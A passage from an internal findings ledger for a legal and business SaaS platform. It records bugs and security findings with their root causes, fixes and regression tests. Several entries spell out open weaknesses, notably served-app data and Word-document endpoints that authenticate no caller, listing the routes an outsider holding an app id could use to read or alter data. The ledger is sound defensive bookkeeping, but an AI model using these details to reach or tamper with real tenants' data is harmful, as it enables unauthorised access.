  `doc.orgId === actor.orgId` — strictly WIDER than the set `PUT /package` accepts, and the same
  too-wide predicate sat in `resolveSkillMdRaw` (`api/src/integrations/definition-registry.ts`). Two
  principals with NO write reach were handed a plaintext `Authorization` header (and the raw
  SKILL.md) that answered `[REDACTED]` before D2: a plain `user` peer over a peer's `org`-shared row
  (PUT 403 `key_taken`), and ANY reader of an OWN-ORG `global` row including its author (PUT 403
  `published_row`). Intra-tenant, so not the cross-org class — but a credential read with no edit to
  protect is a pure exposure, and the A3 re-review had already named this shape (`getForActor`
  legitimately answers a same-org peer's `org` row); A3's fix closed only the CROSS-ORG half of it.
  FIXED: one exported predicate, `canEditDefinitionRaw` (definition-registry.ts) =
  `visibility !== 'global' && sameOrg && canWriteDefinition`, i.e. literally
  `saveAuthoredDefinition`'s admission set, used by BOTH raw projections so the config half and the
  skillMd half of one editable package cannot drift again. Pinned by
  `api/tests/contract/integration-builder.test.ts` ("GET /package raw projection == the PUT
  admission set": the two negatives each asserted alongside their 403 AND the stored bytes being
  unchanged, plus the org-admin POSITIVE so the gate is the save set and not merely "narrower") and
  `api/tests/integrations/definition-registry.test.ts` ("resolveSkillMdRaw is gated on the SAVE
  path"). Revert-verified: 3 registry cases + 2 contract cases go red on the old predicate.

- **`raw-view-predicate-was-a-follow-up-nobody-could-find`** (FIXED 2026-08-03, LOW, process —
  found by the D2 fresh-context re-review). D2's decision entry claimed the duplication of the raw
  view's own-org rule across the route and the registry was "recorded as a follow-up", but there was
  no `docs/findings.md` row, no gate-status marker and no sentence in `docs/decisions.md` saying so.
  A follow-up nobody can find is not recorded — and in this case the un-recorded duplication was the
  exact thing that let the HIGH above exist in two places at once. FIXED by removing the
  duplication rather than tracking it (`canEditDefinitionRaw`, one implementation, two call sites)
  and by this row. LESSON: "recorded as a follow-up" is a claim about an artifact; if the artifact
  is not named, the claim is false.

- **`orgless-actor-can-be-same-org-as-an-orgless-row`** (FIXED-WHERE-REACHABLE 2026-08-03, LOW,
  tenancy predicate — found by the D2 fresh-context re-review, probe S4). Three sites compared org
  ids with a bare `===` while only one had the guard. `isDefinitionVisibleTo`
  (`api/src/integrations/definition-store.ts:202-205`) hardened exactly this ("an org-less actor
  must not become 'same org' as an org-less document") but its `visibility === 'global'` branch
  returns BEFORE that guard, so an org-less actor reading an org-less `global` row reached the
  downstream same-org derivations with `'' === ''` and got the foreign row's plaintext
  `Authorization` back. FIXED at both derivations this change owns: `sameOrg()` in
  definition-registry.ts now guards `canEditDefinitionRaw` (hence both raw projections) and
  `definitionFromDoc`'s `id`/`visibility` projection. Pinned by the registry case "an ORG-LESS actor
  never becomes 'same org' as an ORG-LESS row", which inserts a `orgId: ''` row UNDER the store
  (`create` refuses to mint one) and asserts the row still RESOLVES (global is cross-org, by design)
  while yielding no storage envelope and no byte-exact body.
  RESIDUE, deliberate and stated: the ordering inside `isDefinitionVisibleTo` is NOT changed — that
  file was outside this change's ownership, and on inspection the ordering is also correct on its
  own terms (a `global` row IS visible cross-org, so the guard does not belong on that branch). The
  invariant that matters is that no DOWNSTREAM "this row is mine" derivation may be reached with two
  empty strings; that is now one guarded helper. Reachability stays low either way (registration
  always mints an org, and `IntegrationDefinitionStore.create` rejects `orgId === ''`), so the
  remaining exposure is a malformed/legacy row inserted around the store. CLOSE FULLY BY: auditing
  the other `orgId ===` comparisons outside integrations/ against the same helper.

- **`chokepoint-gate-never-scanned-the-test-suite`** (FIXED 2026-08-03, MEDIUM, gate coverage —
  found by the D2 fresh-context re-review; pre-existing, not D2's). `scripts/chokepoint-grep.sh`
  scanned `api/test` — a fixture directory holding only `fake-daemon` — while its own comment
  claimed it covered "the test harness". `api/tests` (the actual suite) was never scanned, so ~9
  provider references across 7 spec files were invisible to the gate and a genuine raw
  `api.anthropic.com` in a spec would have been too. FIXED: both paths are scanned. The pre-existing
  hits were TRIAGED, not grandfathered — every one turned out to ENFORCE the rule rather than break
  it, and each is exempted at the narrowest granularity that fits it: `api/tests/llm/` by PATH (the
  chokepoint module's own suite, mirroring the `api/src/llm/` exemption one-for-one — it must be
  able to name the SDK it mocks), and five individual LINES by the `chokepoint-gate-allow` marker
  (four anti-leak assertions that the token is ABSENT, plus the `boot-b.mjs` journey harness's
  opt-in `EKOA_LLM_DIRECT` posture, which sets `LLM_CHOKEPOINT_BASE_URL` — the CHOKEPOINT's own
  destination, the sanctioned external-chokepoint topology `llm/credentials.ts` implements — never a
  route around it). No real violation was found. Pinned by
  `api/tests/security/grep-gates.test.ts` ("chokepoint grep gate: scope + exemption mechanism"),
  which runs the REAL script against a planted violation under `api/tests` and asserts it goes red,
  that the marker exempts only its OWN line, and that the tree is currently clean. Revert-verified:
  restoring the `api/test`-only path turns two of those red.

### Part B live proof + walkthrough (run 20260717-190134-9d4c1cbf)

- **`answer-channel-preamble-leak`** (OPEN, MEDIUM, quality). A live chat turn's sheet revision 1
  contained model-internal English preamble ("This is taking too much effort... grep approach...")
  as part of the ANSWER text (no tool boundary separated it, so the transport classification is
  correct - the model narrated inside its answer turn). PT-facing product shows English internals.
  Candidate fixes: answer-shaping instruction in the chat agent context, or a narration-shaped
  head heuristic feeding the thinking channel. Found by the B7 walkthrough vision pass.
- **`knowledge-tool-sync-io-stall`** (OPEN, MEDIUM, perf). Knowledge tool calls block the api
  event loop for multi-second stretches (observed ~3s+ per call during B7 debugging; it stalled
  SSE keep-alives long enough to 502 the old dev proxy). Async/offload candidate.
  **Addendum (C7 voice proof, run 20260717-190134-9d4c1cbf):** the blast radius is wider than
  the SSE-keepalive framing above - the SAME stall was observed delaying an entirely UNRELATED
  live WebSocket connection's server-side message processing (the voice relay's stub STT
  responding to a marker frame) by 9-18s while a concurrent chat run's agent work (tool calls)
  was in flight on the SAME api process. Confirms this is a genuine event-loop-wide stall, not
  scoped to the requesting HTTP/SSE connection - worth weighting into the fix's priority.
- **`context-block-hold-back-leak`** (FIXED 2026-07-18, run 20260717-190134-9d4c1cbf closing security review). Found by the
  C7 voice proof (run 20260717-190134-9d4c1cbf) while driving a real TALKING-mode turn end to
  end: the model's internal `<ekoa-context>{...}</ekoa-context>` state-tracking block (ch05
  §5.7.2, `api/src/agents/markers.ts` `CONTEXT_OPEN`/`CONTEXT_CLOSE`) partially LEAKED onto the
  live `text_chunk` wire and was consequently spoken aloud via the voice pipeline's TTS `say`
  (observed verbatim: `<ekoa-context>\n{"userGoal": "...", "knownContext": [], ...`). The
  persisted (final, authoritative) assistant message was clean - `MarkerProcessor.end()`'s full
  final pass correctly stripped the block from the PERSISTED text - so this WAS a LIVE-STREAM-ONLY
  leak, not a persistence-layer defect. Root cause (read, not yet fixed):
  `MarkerProcessor.drain()`'s split-marker hold-back (`HOLD_BACK = MAX_MARKER_LEN - 1`, ~14 chars)
  protects a MARKER LITERAL (e.g. `<ekoa-context>` itself) from splitting across a chunk
  boundary, but does NOT protect an OPEN-but-not-yet-CLOSED context block's UNBOUNDED body: once
  `<ekoa-context>` has opened and its close tag has not yet arrived, `stripSignals()`'s context
  loop can only wait (`if (close === -1) break`), while `drain()`'s hold-back releases everything
  except the last ~14 characters of the buffer regardless - so as soon as the open tag + body
  grows past the hold-back window (very plausible: the body is a small JSON object, easily
  >14 chars, and can arrive over several deltas while the model keeps generating), the excess
  streams to the wire as if it were safe prose. This affects the ORDINARY (non-voice) chat
  transcript too - text_chunk is the same wire regardless of modality - but no existing test
  scans transcript content for the literal `<ekoa-context>` substring (existing marker tests use
  a short FIXED marker split across exactly two chunks, not an unbounded, late-closing block), so
  it went unnoticed until the voice pipeline made the leak audible. Likely fix direction: track
  "inside an open, unclosed context block" as buffer state and hold back from the open tag
  forward (not just the trailing HOLD_BACK window) until the close tag resolves it. Out of C7's
  scope (agents/markers.ts is shared chat-pipeline infrastructure, not voice-specific); a
  dedicated fix + regression test (a context block whose body exceeds HOLD_BACK, split across
  many small deltas) is owed.
  FIX: `api/src/agents/markers.ts` `drain()` now holds back from an unclosed `<ekoa-context>` open tag (not just the fixed ~marker-length tail) until its close arrives, so the block's body never streams to the live `text_chunk` wire; stripSignals then removes the complete block. Regression-pinned in `api/tests/agents/markers.test.ts` (a split open-block delta whose body must not appear in the live emission). Verified: markers + transport + chat suites 43/43.
- **`chip-title-raw-first-line`** (OPEN, LOW, polish). The composer chip renders the sheet's raw
  first line when no model title exists yet; once reply_summary lands the sheet has a title the
  chip could prefer.

### Cortex gateway (run 20260717-071930-d1244839)

- **`gateway-anon-tooluse-fidelity`** (OPEN, HIGH - found by S6 live proof; a top follow-up item;
  CONFIDENTIALITY dimension added by the run-level security review 2026-07-17). The EXACT deny-listed
  literal never leaks - egress tokenization deep-walks tool_result/tool_use string leaves and is
  fail-closed, so a deny-listed literal in an `ls` output is tokenized before it crosses the wire.
  BUT the run's own live evidence shows the literal comes back to the client MANGLED across turns
  (`ZarkovH90305` -> `ZarkovH9305`, a dropped digit); the deny-list is matched LITERALLY, so the
  corrupted variant is NOT re-tokenized when the CLI feeds it back as a tool_result (e.g. a
  "no such file: ZarkovH9305" error) - a near-miss of the secret literal can then egress to the
  PROVIDER in cleartext (partial, not full, disclosure - to the very party §17.4(b) withholds it
  from; NOT a cross-tenant leak). The re-egress step is inferred from the code path, not yet
  reproduced live - a targeted repro is owed before sizing. Deny-list orgs only; empty-ruleset is a
  proven no-op. The deeper anonymisation-plane fix direction is unchanged; this note re-classes it
  so it is not deprioritised as merely cosmetic.
  With a NON-empty deny-list, a stock Claude Code session cannot reliably navigate a filesystem
  whose paths contain a deny-listed literal: the tokenized directory name that reaches the model in
  a `tool_result` (an `ls`/`find` output) does not reliably detokenize back in the model's next
  `tool_use` argument, so the CLI tries to open the FAKE path and reports "directory not found", or
  the literal comes back mangled across calls (observed: `ZarkovH90305` -> `ZarkovH9305`, a dropped
  digit). This survives the S7 stable-vault fix (tokens are now consistent turn-to-turn), so the
  residual is DETOKENIZATION FIDELITY of `tool_use` argument blocks under the tool_use/tool_result
  density that coding traffic exercises and bridge traffic never did - exactly the brief's §3
  anticipated risk ("coding traffic exercises tool_use/tool_result density the bridge traffic never
  did"). The EMPTY-ruleset case is a true no-op and lands byte-identical (proven live), so ONLY
  deny-list orgs doing filesystem work through Claude Code are affected. Fix is a deeper
  anonymisation-plane change (reliable whole-token detokenization of tool_use args when the model
  reformats/splits a format-preserving fake, plus overlapping deny-list x structured-ID x NER span
  resolution) - a dedicated follow-up run, NOT bolted onto the S6 proof driver. The S6 driver
  records this as an honest KNOWN LIMITATION (never green-washed).

- **`gateway-vault-per-request-instability`** (FIXED by S7, commit bdbc472/d783f7d/31309d9). On the
  gateway path a stock Anthropic client (Claude Code) sends no `metadata.session_id`, so
  `proxyGatewayMessages` opens a FRESH ephemeral vault per request (`sess_${correlationId}`). Vault
  tokens are minted per-class by sequence and are deterministic only WITHIN one vault, so across
  Claude Code's agentic tool loop (each tool step is a separate gateway request) a deny-list literal
  in a filesystem path tokenizes inconsistently and a prior turn's token fails to detokenize - the
  CLI then sees a directory that "does not exist" and the tool loop fails in confusing ways (exactly
  the brief's §3 anticipated failure). The EMPTY-ruleset round trip is a true no-op and lands
  byte-identical (proven live), so only deny-list orgs are affected. Fix (S7): derive a STABLE
  session key for a gateway principal without an explicit session_id (the gateway keyId), so one
  Claude Code session shares one vault (30-min TTL) and tokens stay stable across the loop.

### Contract / schema drift (the schema-coverage honor-system class)

- **`openapi-contentmd-bytes-vs-chars`** (medium, run 20260730 E6). `WriteNoteRequest.contentMd` is
  bounded at 1,000,000 CHARACTERS while the body parser's limit is 1 MiB of BYTES, so a body that is
  VALID against the published spec can still answer 413 - accented Portuguese exceeds one byte per
  character. The 413 is documented on all 10 body-accepting operations and its description names the
  trap, but the schema still promises a size the transport cannot carry. Real fix: narrow
  `contentMd`'s bound or raise the body limit - a behaviour change to shipped endpoints, deliberately
  out of scope for a spec-generation slice.
- **`openapi-body-limit-hand-carried`** (low, run 20260730 E6). The 1 MiB body limit is copied from
  `api/src/server.ts` into the generator's 413 description - the one place the generator does what it
  otherwise refuses (it THROWS rather than guess a media type, but copies this number). Prose only, so
  a stale value misleads a reader without breaking a client, and the drift test asserts the
  BYTE-vs-CHARACTER warning shape but NOT the number, so it can go stale silently. Fix: a `shared/`
  constant read by both.
- **`openapi-automations-path-params-untyped`** (low, run 20260730 E6). The automations routes pass
  `req.params.id`/`stepId` through with no `safeParse`, so the spec types them as bare strings.
  Declaring a `params` schema would encode a constraint the contract does not actually hold AND emit a
  400 those routes never produce, so omitting it is the accurate choice today. Fix: validate the params
  in the routes first, then declare them.
- **`openapi-drift-gate-dirty-source`** (low, run 20260730 E6, KNOWN LIMIT). The generator and its drift
  gate read `@ekoa/shared` from the gitignored `shared/dist`, and the freshness check (`tsc -b --dry`)
  proves dist is CURRENT WITH source, not that source is committed. A concurrent session's uncommitted
  edit, freshly built, therefore lands in the published contract with a green gate - reproduced twice in
  run 20260730, in both directions. Failing on a dirty tree would block the normal edit-build-test loop,
  so the control is procedural: verify a committed generated artifact from a pristine checkout. Possible
  mechanical fix: gate on `git status --porcelain -- shared/` only when a CI env var is set.
- **`automations-runs-limit-unvalidated`** (medium, run 20260730, found by the independent test pass).
  `GET /api/v1/automations/runs` ignores the `limit` constraints the OpenAPI document publishes
  (`limit=0` answers 200 with an empty list instead of 400; `-1`, `501` and `abc` are ignored; `2.5` is
  floored), because the route hand-rolls `Number(req.query.limit)` instead of parsing the shared schema.
  The sibling list operations in the same document (knowledge documents, memvault notes) enforce the
  identical schema exactly, so this is an outlier, not a convention.
- **`automations-idempotency-header-undocumented`** (low, run 20260730, found by the independent test
  pass). `POST /api/v1/automations/{id}/runs` fully implements an `Idempotency-Key` HEADER (replay, 400
  on a repeated raw header, 400 on header/body conflict, empty-as-absent) but documents only the body
  field, so a generated client cannot use the header form or know that misusing it is a 400. Fix: a
  headers field on the descriptor, then emit it.

- **`schema-coverage-honor-system`** (structural). The schema-coverage gate is a hand-maintained
  allowlist that does NOT verify a test exercises each COVERED endpoint; a green gate is not proof a
  body matches its schema. Audit 2026-07-10 found 27 of 154 COVERED keys unexercised and ~6 endpoint
  groups returning schema-violating bodies. The three items below are instances. Real fix: a run-wide
  registry of actually-exercised schemas (specified, unimplemented). Tracked: `docs/testing.md`.
- **`llm-classify-contract`** (medium). `ekoaLocal.llmClassify` handler emits no `category` and reads
  `req.body.prompt`, diverging from the contract input shape; a compliant client gets a schema-
  violating response.
- **`triggerView-active-drop`** (minor). `triggerView` drops the `active`/disabled field (optional
  field silently omitted), so trigger state is invisible to a schema-strict client.
- **`view-timestamps-drop`** (minor). `memoryView` and `artifactView` omit `createdAt`/`updatedAt`
  (optional-drop).
- **F14** (harness-gap, minor). The served-app owner bypass accepts both `Authorization: Bearer` and
  `?token=`; the committed suite asserts only `?token=`. Untested accepted-auth surface.
- **`artifact-cards-invalid-date`** (minor, UX). The expanded "Os Meus Artefactos" cards render
  "Invalid Date" in the date row for every featured artifact (observed live 2026-07-12 on a fresh
  dev stack, all 41 cards). Likely the card formats a missing/differently-shaped timestamp on
  seeded featured artifacts (`createdAt`/`updatedAt` absent or non-ISO) straight through
  `new Date(...)`. Fix: tolerate absent timestamps (hide the row) and add a regression assertion
  that no card ever renders the literal "Invalid Date".
- **`ai-integration-lands-under-platform-tab`** (minor, UX). An AI-built integration saved via the
  chat builder (e.g. open-library, e2e-proof-weather, openweathermap) renders under
  `/integrations?tab=plataforma` ("Integrações da Plataforma"), while "Minhas Integrações"
  (`?tab=minhas`) shows the empty state - so a user who just built an integration and looks under
  "Minhas Integrações" does not find it (confusing). It is available to the org (works), just filed
  under the wrong tab for its provenance. Observed live 2026-07-11. Likely the "mine" filter keys on
  a config/credential-instance concept rather than `userCreated` runtime definitions. Decide the
  intended split and route userCreated runtime defs to the "mine" tab (or relabel the tabs).
- **`integration-handoff-spurious-build`** (medium, UX). Confirming a chat integration offer (the
  two-turn `[[EKOA_INTEGRATION_BUILD]]` handshake) reliably ALSO spawns a real app-build job that
  runs the coding agent with an effectively-empty task and terminates `BUILD_UNFULFILLED` ("A
  construção não chegou à aplicação servida"). Observed live 2026-07-11 for both rest-countries and
  open-library: the integration panel opens and generates+saves correctly (proven — the integration
  lands on `/integrations` with its actions), but the chat column shows a spurious failed build
  alongside it. The build job carries a jobId (server-created) yet no `Vou ligar essa integração
  primeiro.` message precedes it, so it is NOT the build-path in-build classifier; and the client
  `isBuildSession` gate is false on a fresh chat session, so the client message router did not kick
  it — the spurious `build_intent` originates in the server marker orchestration when the
  confirmation turn is classified. Not blocking (the integration still saves) but pollutes the
  handoff. Close by tracing the turn-2 emission: the chat run must emit ONLY the integration signal
  (or, if it emits both, integration must win over build in `agents/chat.ts` — currently build is
  checked first). Add a deterministic test asserting one signal per confirmation turn.

- **`served-app-data-unauthenticated-writes`** (HIGH, pre-existing, operator decision - surfaced by
  H5's destructive-action-authz assertion). The served-app data plane `/api/app-data/:collection`
  authenticates NOTHING about the CALLER: `served-data.ts` `scopeFor()` requires only a well-formed
  `X-Ekoa-App-Id` header + the app OWNER's activation, then scopes to that app's partition. So ANY
  caller who knows an app id/slug can `POST`/`PUT`/`DELETE` that app's data ACROSS TENANTS (a private
  org app's data can be tampered/deleted by an outsider who learns its id). Two compounding facts:
  (1) the manifest collection-rule `access:{ write:'session'|'server' }` is DECLARED but NOT enforced
  by served-data.ts (the write mode is decorative); (2) the app-sso session cookie is
  `Path=/api/app-sso`, so it is not even sent to `/api/app-data` - there is no session to check at
  that path today. NOT introduced by the operator-run (C3/D-era served-app data plane); on a
  DIFFERENT axis from the platform role/capability layer H1-H4 close (which is complete). Phase 10's
  "destructive-action authorization asserted server-side" is NOT met for this surface. FIX (an
  operator architecture decision, a dedicated post-H slice): enforce the declared collection write
  mode and make an app-sso session verifiable at the data path (widen the app-sso cookie path or mint
  a session token the data plane checks); `write:'server'` collections should reject ALL client
  mutations. Pinned as a TRIPWIRE in `api/tests/security/destructive-action-authz.test.ts` (a fix
  flips the test) + behaviorally green today in `api/tests/contract/served-app.test.ts`. Tracked in
  `docs/security.md`.

  **Surface extension 2026-07-24 (2C-S4, `/api/app-docx/*`).** The same posture now also exposes the
  owner's SOURCE WORD DOCUMENT. `api/src/apps/app-docx.ts` mirrors app-files' `admitApp` (mandated
  for consistency), so it too authenticates NO caller - only a well-formed `X-Ekoa-App-Id` plus the
  resolved OWNER's activation. Consequently any caller who knows an app id/slug can: read the full
  document text via `GET /api/app-docx/projection`, download the raw bytes via `GET
  /api/app-docx/current` and `POST /api/app-docx/clean`, and **persist mutations** via `POST
  /api/app-docx/edits` (accept/reject/comment/reply/resolve). Aggravating factor specific to this
  surface: `apps/document-source.ts` `applyReview` resolves the author SERVER-SIDE from the artifact
  owner, so an anonymous outsider's tracked changes and comments are written into a legal `.docx`
  **attributed to the lawyer** (the owner's username), with no record that the caller was not them.
  Remanence: `deleteArtifact` (`api/src/apps/artifacts-service.ts`) removes only the artifact row and
  not the app's data dir - afterwards `resolveApp` returns null, `artifactBacked` is false, the
  owner-activation gate is SKIPPED entirely, and the orphaned document under
  `<EKOA_DATA_DIR>/app-data/{appId}/docx` remains readable and mutable to anyone holding the id. Same
  root cause and same operator decision as the parent entry (no separate fix timeline); a caller/
  session check on the served-app planes closes both. Current state PINNED as a tripwire in
  `api/tests/security/app-docx-authz.test.ts` so a future hardening flips it visibly.

### Gateway / egress

- **`gateway-502-masks-401`** - CLOSED (local-bridge consumer run s7, 2026-07-11, merged from the
  parallel session): typed `CredentialError` -> 503 `credential_error` (non-retryable), rate-cap ->
  429, transient stays 502; `/health claudeAuth.lastProviderError` carries class+timestamp only;
  gateway metadata is an allowlist (`user_id` only), killing the sibling mask.
- **`health-bridgeConnections-mismatch`** (small, merged from the parallel session's recon). `/health
  bridgeConnections` reports `sseManager.connectionCount` (SSE clients), not the bridge registry's
  daemon-socket count the field name promises. One-line fix in server.ts /health + a health contract
  assertion.
- **`e2e-estate-no-committed-env`** (open, structural; merged - extends `e2e-estate-baseline-13`
  below). 49 of 213 due specs red when the WHOLE ledger estate runs against the run-driver stack
  (the served-app compat `/api/v1/action` suites 404 at every commit; demo tours exceed the 30s
  timeout on dev-next latency). Needs a committed full-stack e2e harness + a compat-suite triage.
- **`gateway-apikey-checkAllowance`** (medium, security). The gateway `apikey` principal skips
  `checkAllowance` and bills the platform admin account - an exfil surface reachable from a build
  subprocess. Operator decision owed on the sanctioned posture.
- **F8** (judgment, minor). Provider/credential error surfaces are not user-grade: chat can stream an
  English spec citation, the adapter can leak raw provider JSON, and build failure is a generic PT
  sentence with no cause. Needs one error-mapping layer at the streaming sink (PT message + machine
  code, detail in logs).

### Product bugs

- **`automation-private-visibility-unenforced`** (HIGH, run 20260730, found by the independent test
  pass, FIXED same run). `visibility: 'private'` on an automation was stored, echoed by
  `toWireAutomation`, and published as `Automation.visibility` in the OpenAPI document - and enforced
  nowhere: a same-org peer read a private automation by id and saw it in the list, under a JWT or a
  gateway key. Six diff-reading review rounds missed it because the leaking code was code nobody
  changed; only an agent driving the whole running surface found it. Now one predicate
  (`isVisibleTo`) inside `canReadAutomation`/`canWriteAutomation`: private is OWNER-ONLY, not the
  org-admin and not the super-admin, following `OwnerVisibilityScoped` (the repo's existing rule for
  this exact field) rather than `canSeeRun` (a different resource's default scope). Absent or `'org'`
  keeps legacy behaviour byte for byte. Refusals are a uniform 404 - PATCH/DELETE/run-create
  previously answered 403, which was itself an existence oracle.
- **`automation-managed-metadata-leak`** (low, run 20260730, OPEN). Two paths still expose an
  automation's id and sometimes its NAME to org members regardless of visibility:
  `api/src/automation/integration-automations.ts` `sessionActionRows` (id + name for
  integration-managed automations) and `api/src/events/service.ts` `listTriggers` via `triggerView`
  (opaque id + integrationKey/eventName). Both are metadata on a DIFFERENT resource - the automation
  itself correctly 404s - and the provisioner never marks managed rows private, so this only bites
  after someone PATCHes a managed automation to private. Out of the fixing slice's file set.
- **`automation-triggered-subautomation-owner-skip`** (low, run 20260730, OPEN, pre-existing). A
  trigger-driven run's `sub_automation` step re-enters `runAutomation` with the owner check skipped,
  so a triggered parent could call a sub-automation the trigger owner does not own. Not reachable
  through the public wire (`mapWireStepToEngine` drops `subAutomationId`); only via planner output or
  an integration template.

- **`restoreVersion-featured-500`** (medium). `restoreVersion` on a *featured* artifact still 500s.
  (The broader versions-500 - never-built artifacts and the featured list - was fixed 2026-07-11; this
  case remains.)
- **`web-sourceinput-divergence`** (medium). A web/`shared` `SourceInput` divergence makes a seed-
  template knowledge source 400 from the UI.
- **`login-double-session`** (minor, dev-only). The login landing double-creates sessions (React
  StrictMode double-mount of the eager empty-session create); dev-DB orphan-row noise, and the /chat
  landing intermittently GETs a just-created session id that 404s (the e2e trackers carry a scoped
  exclusion for exactly that 404 pattern - remove it when this closes). The write should be
  idempotent/effect-guarded.
- **`chat-sse-discovery`** (deferred, batch-2). S1 adversarial-tester discovery set: chat-SSE late-
  subscriber gap, run hangs on upstream auth failure, temp-session 404 persist.
- **`web-tests-untypechecked`** (low, batch-2). Web `__tests__` are excluded from tsc, so web test
  files are never typechecked.
- **`e2e-estate-baseline-13`** (medium, per-spec debt). The first honest full-stack estate run
  (2026-07-11, 187/200 green after this run's fixes) leaves 13 red ported specs, ALL pre-existing
  product/UI gaps (none touch this run's diffs): (a) the documented band2 legacy group still built
  around the retired `/api/v1/action` + old stubs - artifact-backend-panel, artifacts-apps-section,
  update-from-bundle, vertical-profile, onboarding x3 (REST migration owed; see
  docs/e2e-harness-remediation-brief.md); (b) integrations UI gaps - pages-manage expects a search
  input the migrated page lost, integrations-sections' Webhooks tab renders no webhook rows,
  integrations-pipedream master-toggle default/persistence semantics differ; (c) legal-content
  gaps - legal-rcbe journey, legal-shared-drift (six scaffolds vs canonical layer), simuladores-
  trabalho exact CT figures. Each is closed by building the missing surface or by an explicit
  retire decision - never by editing the ported spec.

- **`branding-tab-stale-after-research`** (minor, UI freshness). Right after a brand research
  completes, the Marca tab can render the PREVIOUS palette (local component state seeded at page
  load) while `org.branding` already holds the new one - a fresh reload shows the correct values.
  Observed live 2026-07-11 during the walkthrough recording (post-research tab showed `#1A2D5A`,
  persisted+reload truth was `#1C2B4A`). Likely the local-state sync effect on
  `settings/branding/page.tsx` not re-seeding after `fetchCompany()`. Close with a deterministic
  test that researches (fake transport), switches to the Marca tab and asserts the fresh hex.

- **`collection-rule-access-unenforced`** (medium, data-plane; H5 assertion-layer surfaced). A
  collection rule's `access:{write:'session'|'server'}` is DECLARED in the app manifest schema but
  NOT enforced by served-data.ts - all app-data writes are app-id-scoped (owner-activation
  admission), so the per-collection write mode is decorative. Pre-existing C3/data-plane concern,
  OUTSIDE the H security block (which gates the PLATFORM authz; the served-data plane is a separate,
  documented app-id-scoped design). Close by enforcing the declared write mode in served-data.ts OR
  by removing the unenforced field from the manifest schema. Flagged by H5's destructive-action-authz
  assertion (the privileged app-sso ops ARE gated + asserted; this is the general data plane).

- **`h3-edit-mode-no-cancel`** (low, UX fast-follow; H3 fresh review flagged, non-blocking). The admin
  edit-mode `running` phase (`api/assets/panel-runtime/src/edit-mode.js` / `AssistantPanel.jsx`) has
  no client-side timeout, no AbortController, and no Cancel affordance - unlike the sibling visitor
  `send()` in the same panel (which got FETCH_TIMEOUT_MS + AbortController for codex-d2). Toggling the
  edit switch OFF mid-run does not abort the in-flight `runEditPatch`, so a late resolve can flip the
  phase to `preview` with stale shas. The stale-sha CONSEQUENCE is already mitigated (the H6/codex
  fix: `guardedRollback` re-reads HEAD and refuses a stale restore), so this is a UX gap not a data
  hazard. Fast-follow: mirror the visitor path - an AbortController tied to editMode-off/unmount + a
  run-generation guard + a Cancel button. Every server action stays H1-gated regardless.

### Operator-blocked / external

- **`prod-corpus-import`** (external). The real production knowledge corpus import is pending, blocked
  on operator ssh/rsync of the staged corpus. The importer CLI and the `_shared` plane are ready
  (`docs/operations-runbook.md`).
- **`remote-tag-f25`** (operator action). The remote tag `batch1-f25` still points at the broken
  commit `8a2a67b`; re-point with `git push origin +refs/tags/batch1-f25:refs/tags/batch1-f25` (local
  is already at `af8b556`).

### Featured-artifact audit (WS10 Stage A, 2026-08-08)

Full per-artifact evidence and dispositions: `docs/featured-artifacts-ledger.md` (the two review
passes done this day are merged into that one canonical file - a second, more detailed brief arrived
after the first pass had already shipped a doc at a different path; both are consolidated, nothing
dropped). Concrete defects surfaced by the review, logged here per the discovery-run rule (never
silently absorbed into a ledger note):

- **`featured-invoice-manager-noncompliant-invoicing`** (HIGH, compliance). The `invoice-manager`
  featured artifact (`api/assets/featured-artifacts/invoice-manager/scaffold/`) natively generates
  and prints fiscal-looking invoices: `InvoicesPage.jsx`'s `nextInvoiceNumber()` mints sequential
  `FT {year}/{seq}` numbers and `InvoicePrintPage.jsx` renders a full issuer/client-NIF, IVA-broken-
  out, printable document via `window.print()`. This directly contradicts the platform's own stated
  policy elsewhere in the same gallery (`legal-financas`'s manifest: "a emissão de faturas
  certificadas passa exclusivamente pela integração InvoiceXpress (AT) - a Ekoa nunca emite faturas
  nativamente") - Portuguese law requires certified invoicing software for professional fees, so a
  lawyer forking this template to bill honorários would be issuing a non-compliant fatura. Disposed
  DEMOTE in the ledger; Stage B/C should either remove the native-emission flow entirely or redirect
  it through a certified-integration stub before this artifact stays in the gallery in any form.
- **`featured-legal-spine-screenshots-unseeded`** (medium, gallery presentation). Most `legal-*`
  screenshots (`~/.ekoa/data/artifact-screenshots/legal-*.png`, captured 2026-07-18) show an empty/
  zero-data state ("Sem clientes - abra um no Núcleo", empty KPI tiles) because the capture runs the
  artifact standalone without the shared spine's demo data seeded first. Several of the affected
  artifacts (`legal-agenda`, `legal-citius`, `legal-calculos`, `legal-nucleo`, `legal-injuncoes`,
  `legal-insolvencias` among others) are functionally deep on inspection of source, but their gallery
  thumbnail currently undersells that. Recommend recapturing with the seeded spine before any Stage C
  visual "before" comparison. ROOT CAUSE, since found: `legal-nucleo`'s `DashboardPage.jsx` is the
  only scaffold with an "Instalar dados de demonstração" button (`instalarDemo()` in the family's
  shared `demo-spine.js`); nothing else ever installs the demo data, and the shared scope is keyed by
  OWNER (all 29 `legal-*` artifacts share one), so installing once via `legal-nucleo` seeds the whole
  family. FIX WRITTEN (not yet committed/tested): `ensureLegalDemoSpineInstalled()` in
  `api/src/apps/featured-builder.ts` drives that button before any `legal-*` screenshot is
  (re)captured; a deliberate-recapture CLI (`npm run tool:recapture-featured-screenshots --workspace
  api`) forces the 29 already-stale PNGs to refresh, since self-heal only fires on a missing PNG.
  Verified live in an isolated scratch stack (own MongoMemoryServer, own ephemeral port, nowhere near
  the shared dev stack) - real before/after screenshots for `legal-nucleo` (Processos Ativos 0->6,
  Prazos Vencidos/Hoje/7dias 0/0/0->1/1/3, a populated Radar de Prazos and Notificações) and
  `legal-prazos` (cross-artifact confirmation - same four cases surface via the shared owner scope).
  Stays OPEN here until the fix is committed with a test, per the ledger convention.
- **`featured-erp-imobiliario-ptbr-contamination`** (medium, copy quality, KEEP artifact). Grepped
  all 42 artifacts' scaffold source for PT-BR-only markers (`usuário`, `cadastro/cadastrar/
  cadastrado`, `celular`, `aplicativo`, `tela` as "screen"). `erp-imobiliario`'s `App.jsx` uses
  "cadastrado"/"cadastro" roughly 20 times where PT-PT says "registado"/"registo" (e.g. "Nenhum
  cliente cadastrado", "não está cadastrado. Cadastre-o antes de salvar") and "aplicativo da CGD"
  where PT-PT says "aplicação". `invoice-manager` has one instance too ("O cadastro central das
  entidades") but is already demoted for the compliance reason above, so this is moot for it. The
  entire 29-artifact `legal-*` family came back clean (`ecrã`, never `tela`; `registo`/`registar`
  throughout). `erp-imobiliario` is disposed KEEP+UPGRADE in the ledger - this PT-BR cleanup is a
  named Stage C work item, not just an observation, alongside its already-required apartment-
